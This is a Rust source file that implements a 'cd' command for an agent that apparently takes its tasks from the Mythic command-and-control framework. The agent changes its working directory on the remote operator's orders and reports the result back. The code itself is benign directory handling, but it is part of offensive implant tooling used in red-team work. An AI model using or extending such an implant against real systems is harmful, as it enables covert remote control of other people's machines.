use crate::agent::AgentTask;
use crate::mythic_success;
use crate::utils::unverbatim;
use serde::Deserialize;
use std::env;
use std::path::Path;

/// Struct holding the parameters for cd
#[derive(Deserialize)]
struct DirectoryArgs {
    /// Director to cd to
    directory: String,
}

/// Changes the agent's current working directory
/// * `task` - Task information from Mythic
pub fn change_dir(task: &AgentTask) -> std::io::Result<serde_json::Value> {
    // Parse the args into a struct
    let args: DirectoryArgs = serde_json::from_str(&task.parameters)?;

    // Get the current working directory
    let cwd = env::current_dir()?;

    // Parse the directory from the arguments
    let path = Path::new(&args.directory);

    // Canonicalize the cwd with the target directory
    let path = unverbatim(Path::new(&cwd.join(path)).canonicalize()?);

    // Set the current directory
    env::set_current_dir(&path)?;

    // Return the output to Mythic
    Ok(mythic_success!(
        task.id,
        format!("Changed directory to '{}'", path.to_string_lossy())
    ))
}
